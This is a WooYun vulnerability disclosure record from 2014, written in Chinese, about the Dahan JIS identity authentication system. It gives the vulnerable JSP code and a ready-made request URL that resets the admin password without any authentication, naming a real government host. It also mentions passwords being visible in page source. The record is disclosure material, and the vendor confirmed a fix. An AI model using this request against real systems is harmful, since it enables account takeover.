{"id": 4413, "wybug_id": "wooyun-2014-050329", "wybug_title": "大汉版通JIS统一身份认证系统某处可任意修改用户密码", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "wefgod", "wybug_date": "2014-02-06 11:44", "wybug_open_date": "2014-05-07 11:44", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当导致攻击界面扩大", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-07：\t细节向公众公开  简要描述： 不敢乱改。直接就可以改任何用户的密码，不用知道原密码，和之前有的大牛提交的漏洞是不一样的类型。 详细说明：  就修改了一个2.2.1版本的来测试。因为这个已经知道了后台密码，已经修改回去了。另外，星号密码可在源码查看的问题，也顺便一起丢上来好了   漏洞证明：  http://management.ysx.gov.cn/jis/check/jportal/myinfo_do.jsp\n//定义用户对象         Merp_Pub_UserEntity userEntity = new Merp_Pub_UserEntity();   //定义操作类    UserBLF userBlf = new UserBLF(request);   //获取登录名    String loginid=Convert.getParameter(request, \"loginid\", \"\", true, true);    String siteurl = Convert.getParameter(request, \"siteurl\", \"\", true, true);         String year = Convert.getParameter(request, \"year\", \"\", true, true);         String month = Convert.getParameter(request, \"month\", \"\", true,true);         String day = Convert.getParameter(request, \"day\", \"\", true, true);         String vc_sex = Convert.getParameter(request, \"vc_sex\", \"\", true, true);         String vc_email=Convert.getParameter(request, \"vc_email\", \"\", true, true);         String sex=\"\";         if (vc_sex.equals(\"男\")) {            sex = \"1\";      } else {            sex = \"0\";         }         String vc_newpassword = Convert.getParameter(request,\"new_password\",\"\",true,true);\n没有用户的身份验证、各类参数都纯粹是从用户提交的数据中获取的。利用方法：/jis/check/jportal/myinfo_do.jsp?loginid=admin&vc_email=&new_password=123456&vc_username=admin直接可以修改admin的密码登录一看源码就知道已经改成123456了\n\n上面的图片也可以看出，星号密码是可以直接查看的，在普通用户的界面也是有这个问题：\n\n   修复方案：     版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-02-09 09:18 厂商回复： 非常感谢您对大汉产品的关注以及对产品安全方面的指正，涉及问题已在新版本中修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-07 12:38 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  酷炫     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}